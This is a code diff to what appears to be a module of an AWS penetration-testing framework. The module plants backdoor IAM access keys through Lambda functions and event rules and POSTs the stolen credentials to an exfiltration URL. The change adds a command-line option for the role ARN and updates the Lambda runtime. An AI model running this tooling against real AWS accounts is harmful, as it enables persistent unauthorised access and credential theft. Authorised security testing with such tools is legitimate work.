@@ -29,13 +29,15 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--exfil-url', '--cleanup'],
+    'arguments_to_autocomplete': ['--exfil-url','--role-arn', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
 parser.add_argument('--exfil-url', required=False, default=None,
                     help='The URL to POST backdoor credentials to, so you can access them.')
+parser.add_argument('--role-arn', required=False, default=None,
+                    help='The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission.')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true',
                     help='Run the module in cleanup mode. This will remove any known backdoors that the module added '
                          'from the account.')
@@ -134,14 +136,18 @@ def main(args, pacu_main):
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
 
-    while True:
-        target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have '
-                                'at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to '
-                                'enumerate a list of possible roles to choose from: ')
-        if not re.match(r'arn:(aws[a-zA-Z-]*)?:iam::\d{12}:role/?[a-zA-Z_0-9+=,.@\-_/]+', target_role_arn):
-            print('\n[ERROR] ARN format must be: arn:(aws[a-zA-Z-]*)?:iam::\\d{12}:role/?[a-zA-Z_0-9+=,.@\\-_/]+\n')
-        else:
-            break
+    if not args.role_arn:
+        while True:
+            target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have '
+                                    'at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to '
+                                    'enumerate a list of possible roles to choose from: ')
+            if not re.match(r'arn:(aws[a-zA-Z-]*)?:iam::\d{12}:role/?[a-zA-Z_0-9+=,.@\-_/]+', target_role_arn):
+                print('\n[ERROR] ARN format must be: arn:(aws[a-zA-Z-]*)?:iam::\\d{12}:role/?[a-zA-Z_0-9+=,.@\\-_/]+\n')
+            else:
+                break
+    else:
+        target_role_arn=args.role_arn
+
 
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
@@ -179,7 +185,7 @@ def main(args, pacu_main):
         function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
         response = client.create_function(
             FunctionName=function_name,
-            Runtime='python3.6',
+            Runtime='python3.9',
             Role=target_role_arn,
             Handler='lambda_function.lambda_handler',
             Code={
